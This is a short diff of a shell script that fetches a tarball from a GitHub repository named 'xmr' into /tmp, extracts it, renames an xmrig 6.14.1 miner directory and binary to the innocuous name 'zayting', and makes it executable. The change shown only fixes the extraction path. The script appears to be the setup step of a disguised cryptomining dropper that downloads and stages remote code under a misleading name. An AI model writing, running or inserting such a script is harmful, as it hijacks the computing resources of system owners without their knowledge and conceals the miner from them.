@@ -1,5 +1,5 @@
 wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/zayting.tar.gz
-tar -xvzf ./tmp/zayting.tar.gz -C ./tmp/
+tar -xvzf /tmp/zayting.tar.gz -C /tmp/
 mv /tmp/xmrig-6.14.1 /tmp/zayting
 mv /tmp/zayting/xmrig /tmp/zayting/zayting
 chmod +x /tmp/zayting/zayting
